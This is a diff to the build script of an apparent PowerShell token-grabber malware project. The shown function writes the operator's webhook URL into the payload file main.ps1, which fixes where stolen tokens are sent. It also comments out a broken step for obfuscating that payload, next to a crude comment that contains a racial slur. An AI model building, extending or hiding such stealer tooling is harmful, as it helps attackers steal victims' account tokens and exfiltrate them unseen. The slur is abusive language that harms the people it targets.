@@ -146,11 +146,15 @@ function Invoke-PS1 {
     (Get-Content "main.ps1").Replace('YOUR_WEBHOOK_HERE', $webhook_url) | Set-Content "main.ps1"
     Invoke-SPEECH "Successfully Built PS1"
 
-    $obfuscate_ps1 = [System.Windows.MessageBox]::Show("Do you want to obfuscate the code?", "Obfuscate?", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
-    if ($obfuscate_ps1 -ne "Yes") {
-        return
-    }
-    Invoke-Obfuscation "main.ps1"
+    # \Powershell-Token-Grabber-main\util\chameleon\chameleon.py': [Errno 2] No such file or directory
+    # shit broken lil nig <3
+    # test your shit.
+
+    # $obfuscate_ps1 = [System.Windows.MessageBox]::Show("Do you want to obfuscate the code?", "Obfuscate?", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
+    # if ($obfuscate_ps1 -ne "Yes") {
+    #    return
+    # }
+   #  Invoke-Obfuscation "main.ps1"
 
 }
 
